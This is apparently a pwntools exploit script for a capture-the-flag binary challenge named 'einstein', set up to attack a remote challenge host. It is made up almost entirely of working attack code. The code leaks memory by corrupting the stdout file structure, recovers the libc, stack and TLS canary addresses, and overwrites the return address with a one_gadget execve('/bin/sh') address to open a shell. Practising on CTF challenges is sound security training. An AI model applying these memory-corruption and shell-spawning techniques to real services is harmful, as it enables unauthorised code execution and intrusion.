#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './einstein_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    # breakrva 0x1326
    # breakrva 0x13a2
    # breakrva 0x13a8
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#0x54f4c posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x68 is writable
#  rsp & 0xf == 0
#  rax == NULL || {"sh", rax, rip+0x16b4aa, r12, ...} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0x54f53 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x68 is writable
#  rsp & 0xf == 0
#  rcx == NULL || {rcx, rax, rip+0x16b4aa, r12, ...} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0xeb60e execve("/bin/sh", rbp-0x50, r12)
#constraints:
#  address rbp-0x48 is writable
#  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp

#0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
#constraints:
#  address rbp-0x50 is writable
#  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

def write(where, what):
    io.sendline(str(where).encode() + b" " + str(what).encode())
    sleep(0.2)

def exploit():
   global io
   io = initialize()
   #Malloc big size so it start libc address
   io.sendlineafter("How long is your story ?", str(0x80000).encode())

   #Overwriting Stdout + 0x28
   #gdb.attach(io, gdbscript=gdbscript)
   offset = -0x33a010 + (libc.sym["_IO_2_1_stdout_"] + 0x28) #GDB
   offset = -0x291010 + (libc.sym["_IO_2_1_stdout_"] + 0x28) #Normal
   offset = 0x83ff0 + (libc.sym["_IO_2_1_stdout_"] + 0x28) #Docker

   io.sendlineafter("What's the distortion of time and space ?", str(offset).encode())
   io.sendafter("Well your story is quite long, time may be distored, but it is a priceless ressource, i'll give you a few words only, use them wisely.", b"\xff")
   io.recvline()
   io.recv(5) #Adjusting to stdout
   leak = io.recvuntil("Everything")

    #Dump
   for i in range(20):
       log.info("Leak %#d: %#x", i+1, u64(leak[i*8:(i+1)*8]))

    #Libc leaks
   libc_leak = u64(leak[10*8:11*8])
   libc.address = libc_leak - libc.sym["_IO_file_jumps"]
   log.info("Libc leak: %#x", libc_leak)
   log.info("Libc base: %#x", libc.address)
   log.info("Strlen libc got: %#x", libc.got.strlen)

   #Stack leaks
   stack_leak = u64(leak[19*8:20*8])
   ret = stack_leak - 0x120
   rbp = ret + 0x8
   log.info("Stack leak: %#x", stack_leak)
   log.info("Ret: %#x", ret)
   log.info("RBP: %#x", rbp)

   #Tls leak
   tls = libc.address - 0x28c0
   canary = tls + 0x28
   log.info("Tls base: %#x", tls)
   log.info("Tls canary: %#x", canary)

   #One Gadgets
   write(ret, libc.address + 0xeb66b)
   write(rbp - 0x78, 0)

   #Got stack_chk_fail
#    write(canary, 0)
#    write(libc.got.strlen, libc.address + 0x110692)
   io.interactive()

if __name__ == '__main__':
    exploit()
